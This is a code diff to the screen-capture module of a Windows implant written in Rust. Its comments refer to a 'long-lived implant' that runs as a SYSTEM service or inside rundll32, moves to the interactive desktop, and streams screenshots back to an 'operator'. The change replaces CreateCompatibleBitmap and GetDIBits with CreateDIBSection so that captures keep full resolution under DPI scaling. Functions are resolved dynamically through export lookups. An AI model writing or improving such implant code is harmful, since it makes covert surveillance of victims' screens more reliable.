@@ -230,11 +230,18 @@ fn set_dpi_aware() -> bool {
 
 // ---- BITMAPINFOHEADER -----------------------------------------------------
 
-/// Win32 `BITMAPINFOHEADER` (40 bytes). Used both as the `GetDIBits` request
-/// descriptor and as the in-file info header layout (BMP stores it verbatim).
-/// `biHeight` is kept POSITIVE so GetDIBits fills bottom-up — which exactly
-/// matches BMP's bottom-up row order, so the pixel bytes drop straight into the
-/// file body with no flip.
+/// Win32 `BITMAPINFOHEADER` (40 bytes). Plays three roles in the new capture
+/// pipeline:
+/// 1. The `BITMAPINFO` passed to `CreateDIBSection` — its `biWidth/biHeight`
+///    fix the DIB's size in RAW PHYSICAL pixels (NOT the DC's logical coords,
+///    which is where `CreateCompatibleBitmap` got DPI-virtualized into a
+///    half-size crop). This is the size the resulting BMP will carry.
+/// 2. The source of truth for the 40-byte info header emitted into the BMP
+///    file body — BMP stores it verbatim, so we hand the same struct to both.
+/// 3. `biHeight` is kept POSITIVE so the DIB surface is bottom-up — which
+///    exactly matches BMP's bottom-up row order, so the pixels `CreateDIBSection`
+///    maps (`ppvBits`) drop straight into the file body with no flip and no
+///    second `GetDIBits` copy.
 #[repr(C)]
 struct BitmapInfoHeader {
     bi_size: u32,
@@ -301,10 +308,11 @@ fn chunk_stream(data: Vec<u8>, name: &str) -> Vec<Response> {
 /// the operator can tell whether the virtual-screen capture is tiling more
 /// than one physical display.
 ///
-/// GDI sequence: GetDC → CreateCompatibleDC → CreateCompatibleBitmap →
-/// SelectObject → BitBlt(SRCCOPY) → GetDIBits(32bpp BI_RGB) → assemble BMP →
-/// cleanup. Every DC/bitmap handle is released on every return path; a leak
-/// here kills the long-lived implant.
+/// GDI sequence: GetDC → CreateCompatibleDC → CreateDIBSection(32bpp BI_RGB,
+/// size from `BITMAPINFOHEADER.biWidth/biHeight`, NOT the DC's logical coords)
+/// → SelectObject → BitBlt(SRCCOPY|CAPTUREBLT) → memcpy out of the DIB's mapped
+/// `ppvBits` → assemble BMP → cleanup. Every DC/bitmap handle is released on
+/// every return path; a leak here kills the long-lived implant.
 /// Best-effort relocation to the interactive window station + desktop.
 ///
 /// In Session 0 (SYSTEM service) the process is attached to a non-interactive
@@ -527,8 +535,39 @@ pub unsafe fn count_displays() -> u32 {
 /// streams chunks) and `capture_to_file` (helper export, writes file).
 ///
 /// Returns the BMP bytes plus `true` if DPI awareness was set successfully,
-/// `false` if all three DPI APIs failed (the capture still proceeds but may be
-/// DPI-virtualized — `do_screenshot` flags this in the chunk filename).
+/// `false` if all three DPI APIs failed (the capture still proceeds but the
+/// pixels BitBlt copies in may be scaled — the BMP SIZE is still correct, see
+/// below; `do_screenshot` flags this in the chunk filename).
+///
+/// ## Why `CreateDIBSection` (not `CreateCompatibleBitmap` + `GetDIBits`)
+///
+/// The OLD pipeline did `CreateCompatibleBitmap(hdc, w, h)` → `BitBlt` →
+/// `GetDIBits`. `CreateCompatibleBitmap` interprets `w/h` in the DC's LOGICAL
+/// coordinate system, which is subject to DPI virtualization. Whenever the
+/// three-tier DPI ladder below failed to stick (rundll32 manifest pinning
+/// process awareness, RDP session scaling ≠ system DPI, pre-1607 hosts, or
+/// BitBlt spanning monitors with different DPIs), the DDB came back at the
+/// *logical* pixel count — a real 2294×1438 @200% desktop was captured as
+/// 1147×719, exactly half on each axis. `GetDIBits` then faithfully read back
+/// that already-shrunk DDB — the size error was locked in at allocation.
+///
+/// `CreateDIBSection` takes the size from the `BITMAPINFOHEADER` we hand it,
+/// i.e. from `SM_CX/CYVIRTUALSCREEN` (raw physical pixels), NOT from the DC.
+/// The allocation is DPI-independent by construction. Even in the worst case
+/// (DPI ladder totally fails), the bitmap is still allocated at the physical
+/// size; BitBlt may then copy a scaled image INTO it, but the BMP dimensions
+/// are correct and the crop bug is gone.
+///
+/// ## Multi-version Windows adaptation
+///
+/// `CreateDIBSection` is available on Windows 2000+ — every supported target
+/// (Server 2019 / build 17763, Win11 24H2 / build 26100, and everything in
+/// between) ships it in gdi32. No version branching is needed for the capture
+/// primitive itself. The DPI-awareness ladder above this call
+/// (`SetProcessDpiAwarenessContext` PMv2 on 1703+ → `shcore!
+/// SetProcessDpiAwareness` on 8.1+ → `SetProcessDPIAware` on Vista/7) already
+/// covers the version matrix, and the thread-level PMv2 context override
+/// handles the rundll32-hosted manifest-pinned case on 1607+.
 fn capture_bmp() -> Option<(Vec<u8>, bool)> {
     if !force_load(b"user32.dll") || !force_load(b"gdi32.dll") {
         return None;
@@ -539,7 +578,7 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
     // session with per-session scaling ≠ system DPI.
     let old_ctx = set_thread_dpi_pmv2();
     // Process-level fallback for pre-1607 hosts. Must come BEFORE any
-    // GetDC / CreateCompatibleBitmap.
+    // GetDC / CreateDIBSection.
     let dpi_aware = set_dpi_aware() || old_ctx.is_some();
     let _ = unsafe { attach_interactive() };
 
@@ -550,8 +589,22 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
         type GetDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
         type ReleaseDc = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
         type CreateCompatibleDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
-        type CreateCompatibleBitmap =
-            unsafe extern "system" fn(*mut c_void, i32, i32) -> *mut c_void;
+        // CreateDIBSection signature:
+        //   HDC hdc, CONST BITMAPINFO *pbmi, UINT usage,
+        //   VOID **ppvBits, HANDLE hSection, DWORD offset
+        // `usage` = DIB_RGB_COLORS (0). `hSection`/`offset` = NULL/0 (page-file
+        // backed — the common case; we don't need a shared memory section).
+        // Returns HBITMAP (NULL on failure) AND sets *ppvBits to the mapped
+        // pixel buffer (NULL on failure). The returned HBITMAP owns the
+        // mapping — DeleteObject releases it.
+        type CreateDibSection = unsafe extern "system" fn(
+            *mut c_void,
+            *const BitmapInfoHeader,
+            u32,
+            *mut *mut c_void,
+            *mut c_void,
+            u32,
+        ) -> *mut c_void;
         type SelectObject = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
         type BitBlt = unsafe extern "system" fn(
             *mut c_void,
@@ -564,15 +617,6 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
             i32,
             u32,
         ) -> i32;
-        type GetDiBits = unsafe extern "system" fn(
-            *mut c_void,
-            *mut c_void,
-            u32,
-            u32,
-            *mut c_void,
-            *mut BitmapInfoHeader,
-            u32,
-        ) -> i32;
         type DeleteObject = unsafe extern "system" fn(*mut c_void) -> i32;
         type DeleteDc = unsafe extern "system" fn(*mut c_void) -> i32;
 
@@ -583,13 +627,11 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
             unsafe { core::mem::transmute(export_addr(b"user32.dll", b"ReleaseDC")?) };
         let ccdc: CreateCompatibleDc =
             unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateCompatibleDC")?) };
-        let ccb: CreateCompatibleBitmap =
-            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateCompatibleBitmap")?) };
+        let cds: CreateDibSection =
+            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateDIBSection")?) };
         let so: SelectObject =
             unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"SelectObject")?) };
         let bb: BitBlt = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"BitBlt")?) };
-        let gdb: GetDiBits =
-            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"GetDIBits")?) };
         let do_: DeleteObject =
             unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteObject")?) };
         let ddc: DeleteDc =
@@ -605,9 +647,32 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
         let (w, h) = (w as usize, h as usize);
         let pc = w.checked_mul(h).filter(|&c| c <= MAX_PIXELS)?;
         let bytes = pc.checked_mul(4)?;
-        let mut pixels: Vec<u8> = vec![0u8; bytes];
 
-        let filled = unsafe {
+        // BITMAPINFOHEADER used as BOTH the CreateDIBSection input descriptor
+        // AND the in-file info header. biHeight POSITIVE → bottom-up DIB, which
+        // is exactly BMP's row order, so no flip is needed on the way to the
+        // file body. biCompression = 0 (BI_RGB) — no color table follows.
+        let bi = BitmapInfoHeader {
+            bi_size: 40,
+            bi_width: w as i32,
+            bi_height: h as i32,
+            bi_planes: 1,
+            bi_bit_count: 32,
+            bi_compression: 0,
+            bi_size_image: (w as u32) * (h as u32) * 4,
+            bi_x_pels_per_meter: 0,
+            bi_y_pels_per_meter: 0,
+            bi_clr_used: 0,
+            bi_clr_important: 0,
+        };
+
+        // owned_pixels takes ownership of the CreateDIBSection-mapped buffer so
+        // it gets copied into a heap Vec BEFORE we DeleteObject the HBITMAP
+        // (which unmaps the DIB section). The copy is mandatory — the mapped
+        // memory is freed by DeleteObject, so we can't return a slice into it.
+        // None means the GDI sequence failed at some step; the cleanup paths
+        // inside the unsafe block already released every handle in that case.
+        let owned_pixels: Option<Vec<u8>> = unsafe {
             let sdc = gdc(core::ptr::null_mut());
             if sdc.is_null() {
                 return None;
@@ -617,8 +682,19 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
                 rdc(core::ptr::null_mut(), sdc);
                 return None;
             }
-            let bmp = ccb(sdc, w as i32, h as i32);
-            if bmp.is_null() {
+            let mut ppv_bits: *mut c_void = core::ptr::null_mut();
+            // CreateDIBSection allocates the DIB at EXACTLY bi_width × bi_height
+            // (× 4 bytes/pixel at 32 bpp), regardless of the DC's DPI awareness
+            // state. This is the fix for the size bug — see the function doc.
+            let bmp = cds(
+                sdc,
+                &bi,
+                DIB_RGB_COLORS,
+                &mut ppv_bits,
+                core::ptr::null_mut(),
+                0,
+            );
+            if bmp.is_null() || ppv_bits.is_null() {
                 ddc(mdc);
                 rdc(core::ptr::null_mut(), sdc);
                 return None;
@@ -642,37 +718,21 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
                 rdc(core::ptr::null_mut(), sdc);
                 return None;
             }
-            let mut bi = BitmapInfoHeader {
-                bi_size: 40,
-                bi_width: w as i32,
-                bi_height: h as i32,
-                bi_planes: 1,
-                bi_bit_count: 32,
-                bi_compression: 0,
-                bi_size_image: (w as u32) * (h as u32) * 4,
-                bi_x_pels_per_meter: 0,
-                bi_y_pels_per_meter: 0,
-                bi_clr_used: 0,
-                bi_clr_important: 0,
-            };
-            let got = gdb(
-                sdc,
-                bmp,
-                0,
-                h as u32,
-                pixels.as_mut_ptr() as *mut c_void,
-                &mut bi,
-                DIB_RGB_COLORS,
-            );
+            // BitBlt has now filled the DIB section's pixel buffer through the
+            // memory DC. Copy bytes out of the mapped surface into a heap Vec
+            // BEFORE DeleteObject — once we release the HBITMAP the mapping is
+            // gone and ppv_bits dangles. We must NOT wrap ppv_bits in a Vec
+            // (Vec's destructor would call our allocator on memory Windows
+            // owns); a plain memcpy into a fresh heap allocation is correct.
+            let mut pixels: Vec<u8> = vec![0u8; bytes];
+            core::ptr::copy_nonoverlapping(ppv_bits as *const u8, pixels.as_mut_ptr(), bytes);
             so(mdc, prev);
             do_(bmp);
             ddc(mdc);
             rdc(core::ptr::null_mut(), sdc);
-            got != 0
+            Some(pixels)
         };
-        if !filled {
-            return None;
-        }
+        let pixels = owned_pixels?;
 
         let fs = 14 + 40 + pixels.len();
         let mut b: Vec<u8> = Vec::with_capacity(fs);
